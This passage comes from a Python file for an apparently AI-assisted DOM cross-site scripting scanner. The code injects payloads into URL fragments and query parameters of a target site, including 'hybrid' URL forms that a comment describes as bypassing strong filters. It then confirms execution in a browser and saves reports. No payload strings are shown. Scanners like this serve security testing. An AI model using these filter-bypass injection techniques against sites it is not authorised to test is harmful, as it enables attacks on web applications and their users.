                    # Create vulnerability report
                    vuln = DOMXSSVulnerability(
                        vulnerability_id=f"dom_xss_{timestamp}",
                        source=DOMSource(
                            source_type=vector['source'],
                            parameter=vector.get('parameter'),
                            value=vector['payload']
                        ),
                        sink=DOMSink(
                            sink_type=vector['sink'],
                            sink_location='',
                            tainted_value=vector['payload']
                        ),
                        payload=vector['payload'],
                        executed=True,
                        execution_evidence=evidence,
                        url=test_url,
                        timestamp=timestamp,
                        severity='high',
                        recommendation=f"Sanitize {vector['source']} before using in {vector['sink']}"
                    )

                    return vuln

            except Exception as e:
                self.logger.error(f"Error testing vector: {e}")
            finally:
                await browser.close()

        return None

    def _build_test_url(self, base_url: str, vector: Dict) -> str:
        """
        Build test URL with payload based on vector type
        """
        parsed = urlparse(base_url)

        if vector['test_url_pattern'] == 'append_hash':
            # Append to hash
            return f"{base_url}#{vector['payload']}"

        elif vector['test_url_pattern'] == 'query_param':
            # Add to query parameter
            params = parse_qs(parsed.query)
            param_name = vector.get('parameter', 'xss')
            params[param_name] = [vector['payload']]
            new_query = urlencode(params, doseq=True)
            return urlunparse(parsed._replace(query=new_query))

        elif vector['test_url_pattern'] == 'hybrid_hash_query':
            # Hybrid: #?param=payload (bypasses high security filters)
            param_name = vector.get('parameter', 'default')
            payload = vector['payload']
            # Use fragment + query syntax
            return f"{base_url}#?{param_name}={quote(payload)}"

        elif vector['test_url_pattern'] == 'hybrid_query_hash':
            # Reverse hybrid: ?param=value#fragment
            param_name = vector.get('parameter', 'default')
            payload = vector['payload']
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            # Add hash after query
            return urlunparse(parsed._replace(query=new_query)) + f"#{payload}"

        else:
            return base_url

    def _clean_json_response(self, response: str) -> str:
        """Clean AI response to extract JSON - improved parsing to handle text before JSON"""
        if not response:
            return "[]"

        cleaned = response.strip()

        # First, try to extract from markdown code blocks
        if "```json" in cleaned:
            start = cleaned.find("```json") + 7
            end = cleaned.find("```", start)
            if end != -1:
                cleaned = cleaned[start:end].strip()
        elif "```" in cleaned:
            # Find first ``` and last ```
            first_block = cleaned.find("```")
            # Skip the opening ```
            start = first_block + 3
            # Skip any language identifier on the same line
            newline = cleaned.find("\n", start)
            if newline != -1:
                start = newline + 1
            # Find closing ```
            end = cleaned.find("```", start)
            if end != -1:
                cleaned = cleaned[start:end].strip()

        # CRITICAL FIX: Extract JSON array even if there's text before it
        # Look for the first '[' that starts a JSON array
        if '[' in cleaned:
            start = cleaned.find('[')

            # Verify this looks like start of JSON array by checking what comes after
            # Skip any whitespace after '['
            test_idx = start + 1
            while test_idx < len(cleaned) and cleaned[test_idx] in ' \t\n\r':
                test_idx += 1

            # Check if this looks like a JSON array (should have { or ] after [)
            if test_idx < len(cleaned) and cleaned[test_idx] in '{]':
                # Count brackets to find the matching closing bracket
                bracket_count = 0
                in_string = False
                escape_next = False

                for i in range(start, len(cleaned)):
                    char = cleaned[i]

                    if escape_next:
                        escape_next = False
                        continue

                    if char == '\\':
                        escape_next = True
                        continue

                    if char == '"' and not escape_next:
                        in_string = not in_string
                        continue

                    if not in_string:
                        if char == '[':
                            bracket_count += 1
                        elif char == ']':
                            bracket_count -= 1
                            if bracket_count == 0:
                                json_str = cleaned[start:i+1]
                                # Validate it's valid JSON before returning
                                try:
                                    json.loads(json_str)
                                    return json_str
                                except:
                                    # Try next '[' if this one didn't work
                                    pass

        # If we still haven't found valid JSON, try harder
        # Look for any text between [ and ] that looks like JSON
        import re
        json_pattern = r'\[\s*\{.*?\}\s*\]'
        matches = re.findall(json_pattern, cleaned, re.DOTALL)
        if matches:
            # Return the longest match (most likely to be complete)
            longest = max(matches, key=len)
            try:
                json.loads(longest)
                return longest
            except:
                pass

        # Last resort: return empty array
        self.logger.warning("Could not extract valid JSON from LLM response")
        return "[]"

    def save_results(self, vulnerabilities: List[DOMXSSVulnerability], output_file: str = "./dom_xss_results.json"):
        """Save DOM XSS results to file"""
        os.makedirs("./results", exist_ok=True)

        results_data = {
            "scan_date": datetime.now().isoformat(),
            "total_vulnerabilities": len(vulnerabilities),
            "vulnerabilities": [asdict(v) for v in vulnerabilities]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2, default=str)

        # Also save to results directory
        with open("./results/dom_xss_results.json", 'w') as f:
            json.dump(results_data, f, indent=2, default=str)

        self.logger.info(f"DOM XSS results saved to {output_file}")


# Standalone testing
async def main():
    import argparse

    parser = argparse.ArgumentParser(description='DOM XSS Detection Agent')
    parser.add_argument('target_url', help='Target URL to test')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy')
    args = parser.parse_args()

    agent = DOMXSSAgent()
    vulnerabilities = await agent.detect_dom_xss(args.target_url)

    print(f"\n=== DOM XSS Detection Results ===")
    print(f"Vulnerabilities found: {len(vulnerabilities)}")

    for vuln in vulnerabilities:
        print(f"\n[!] DOM XSS Confirmed")
        print(f"    Source: {vuln.source.source_type}")
        print(f"    Sink: {vuln.sink.sink_type}")
        print(f"    Payload: {vuln.payload}")
        print(f"    URL: {vuln.url}")

    agent.save_results(vulnerabilities)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
